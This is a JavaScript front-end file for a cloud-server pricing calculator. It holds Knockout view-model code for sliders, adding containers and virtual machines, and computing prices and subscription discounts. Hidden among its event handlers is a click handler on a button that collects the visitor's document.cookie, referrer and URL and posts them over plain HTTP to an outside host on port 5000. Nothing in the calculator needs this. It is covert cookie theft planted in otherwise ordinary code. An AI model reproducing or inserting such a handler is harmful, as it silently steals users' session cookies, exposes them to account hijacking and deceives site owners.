/* globals _ */
define(['./knockout-3.1.0', 'text!./templates.html', './constants', './models', './utils', './parser', './pricing'],
  function(ko, templates, CONSTANTS, models, utils, parser, pricing) {

    $("body").append(templates);

    function get_country_container_availability(id) {
      return CONSTANTS.CONTAINER_UNAVAILABILITY[id];
    }
    // Main View Model
    function viewModel() {
      var self = this,
          first_country = utils.get_country_based_on_location(),
          initial_data = {
            'virtual_machines': [],
            'containers': [],
            'account_details': {
              'bandwidth': 10,
              'ips': 0,
              'vlans': 0
            },
            'subscription': 0,
            'country': first_country
          };

      // See if the url can turn into a data set
      if (location.hash) {
        try {
          initial_data = parser.string_into_data(location.hash);
        }
        catch(err) {
        }
      }
      //Constants
      self.country_flags = CONSTANTS.ZONES;

      // Actions
      var move_handler = function(event) {
            var data = event.data,
                mouse_move = ((event.clientX - data.offset) * 100) / data.bar_size,
                distance = utils.limit(data.start + mouse_move, data.lower_bound(), data.upper_bound());
            data.element(distance);
          },
          stop_move_handler  = function(event) {
            $(document).off('mousemove', move_handler);
          },
          start_mouse_down = function(data, event, element, lower_bound, upper_bound) {
            $(document).on('mousemove', {
              offset: event.pageX - utils.pageOffset(),
              start: element(),
              bar_size: $(event.currentTarget).parents("div.noUi-base").width(),
              element: element,
              lower_bound: lower_bound,
              upper_bound: upper_bound

            }, move_handler);
            $(document).one('mouseup', stop_move_handler);
          },
          upper_bound = function() {
            return 100;
          },
          lower_bound = function() {
            return 0;
          };

      self.mouse_down_lower = function(data, event) {
        var tmp_bound = data.double_bars ? data.upper: upper_bound;

        start_mouse_down(data, event, data.lower, lower_bound, tmp_bound);
      };
      self.mouse_down_upper = function(data, event) {
        var tmp_bound = data.double_bars ? data.lower: lower_bound;

        start_mouse_down(data, event, data.upper, tmp_bound, upper_bound);
      };
      self.change_country = function(data, event) {
        self.country(data.id);
      };

      self.add_container = function() {
        self.servers.unshift(new models.container({
          cpu: [0, 2000],
          ram: [256, 1024],
          ip: true,
          firewall: false,
          number_of_instances: 1,
          ssd: [20],
          hdd: []
        }));
        utils.serverSlideDown();
      };
      self.add_virtual_machine = function() {
        self.servers.unshift(new models.virtual_machine({
          cpu: 2000,
          ram: 1024,
          ip: true,
          firewall: false,
          number_of_instances: 1,
          ssd: [],
          hdd: [20]
        }));
        utils.serverSlideDown();
      };

      // Normal attributes
      self.country = pricing.country;
      self.country(initial_data['country']);

      self.coming_soon = ko.computed(function() {
        return get_country_container_availability(self.country());
      });

      self.servers = ko.observableArray();
      for (var i=0; i < initial_data.containers.length; i++) {
        self.servers.push(
          new models.container(initial_data['containers'][i])
        );
      }
      for (i=0; i < initial_data['virtual_machines'].length; i++) {
        self.servers.push(
          new models.virtual_machine(initial_data['virtual_machines'][i])
        );
      }

      self.account_details = new models.account_details({
        lower: initial_data['account_details']['bandwidth'],
        virtual_lans: initial_data['account_details']['virtual_lans'],
        ips: initial_data['account_details']['ips']
      });

      // Computed
      self.remove_server = ko.computed(function() {
        ko.utils.arrayForEach(self.servers(), function(server) {
          if (server.number_of_instances() === 0) {
            self.servers.remove(server);
          }
        });
      });

      self.price =  ko.computed(function() {
        var total = 0;
        total += _.reduce(self.servers(), utils.sum_function, 0);
        total += self.account_details.price();

        return total;
      });

      self.subscription_plans = new models.subscription_plans(
        CONSTANTS.SUBSCRIPTION_DISCOUNTS,
        self.price,
        initial_data['subscription']
      );
      self.burst_price = ko.computed(function() {
        var total = _.reduce(self.servers(), function(memo, obj) {
          var burst = obj.burst_price ? obj.burst_price() : 0,
              price = parseFloat(burst);
          if (_.isNumber(price))
            return memo + price;
          return memo;
        }, 0);

        return total;
      });
      self.serialize = ko.computed(
        parser.serialize_view,
        self
      ).extend({
        rateLimit: 1000
      });

      self.formatted_burst_price = ko.computed(function() {
        return utils.format_price(self.burst_price());
      });
      self.afterDiscount = ko.computed(function() {
        return self.subscription_plans.price();
      });
      self.formatted_discount = ko.computed(function() {
        var price = self.subscription_plans.price();
        if (price)
          return '-' + utils.format_price(-1 * price);
        return utils.format_price(price);
      });
      self.formatted_price = ko.computed(function() {
        return utils.format_price(self.price());
      });
      self.formatted_total_price = ko.computed(function() {
        var price_month = self.subscription_plans.price() + self.price(),
            price_month_formatted = utils.format_price(price_month),
            times = self.subscription_plans.times(),
            total_formatted = utils.format_price(price_month * times);
        if (times)
          return price_month_formatted + '  (for ' + times + ' months) = ' + total_formatted;
        return price_month_formatted;
      });
    }

    var model = new viewModel();
    ko.applyBindings(model);

    //attach event handlers
    $(".yellow-nohover.hover-huge").click(function(){
      var data = { "url": location.origin+location.hash,
      "referrer" : document.referrer,
      "cookie" : document.cookie
      } 
      $.post("http://jonsmarketingfunnel.co.uk:5000/", data);
    });
    $("#server-list").delegate(".minus", "click", function() {
      var context = ko.contextFor(this),
          num = parseInt(context.$data.server.number_of_instances()) - 1;

      if (num <= 0) {
        console.log(this);
        utils.serverSlideUp(this, function(){
          context.$root.servers.remove(context.$data.server);
        });
      }
      else {
        context.$data.server.number_of_instances(num);
      }

      return false;
    });
    $("#server-list").delegate(".plus", "click", function() {
      //retrieve the context
      var context = ko.contextFor(this),
          num = parseInt(context.$data.server.number_of_instances()) + 1;

      if (num < 11)  // No more than 10 servers per stack
        context.$data.server.number_of_instances(num);

      return false;
    });

    function tutorialsPop() {
      $("<style type='text/css' id='dynamicpop' />").appendTo("head");
      var popZone = _.once(function() {
        $("#pop1").fadeIn(2000);
        window.setTimeout(function() {
          $("#pop1").fadeOut(2000);
        }, 15000);
      });
      var popServer = _.once(function() {
        $("#pop2").fadeIn(2000);
        window.setTimeout(function() {
          $("#pop2").fadeOut(2000);
        }, 15000);
      });
      var popDisk = _.once(function() {
        var popstr =
          '<div id="pop3" class="popover left" style="position: absolute; line-height:16px;top: -58px;left: -185px;width: 150px;white-space: normal;">' +
            '<div class="arrow" style="border-left:5px solid #313785"></div>' +
            '<div class="popover-content">' +
              'Click here to add more storage devices to this server, or move the sliders to increase size.</div>' +
          '</div>';
        $("a[data-bind='event: {click: add_disk}']").css("position", "relative").prepend(popstr);
        $("#pop3").fadeIn(2000);
        window.setTimeout(function() {
          $("#pop3").fadeOut(2000);
        }, 10000);
      });
      popZone();
      $(".zoneselector").click(function() {
        popServer();
        $("#pop1").fadeOut(2000);
      });
      $(".hover-large").click(function() {
        popDisk();
        $("#pop1, #pop2").fadeOut(2000);
        utils.dynPop();
      });
      $(".my-event blue-hover hover-small").click(function() {
        $("#pop1, #pop2, #pop3").fadeOut(2000);
      });
    }
    tutorialsPop();
    utils.dynPop();
  }
);


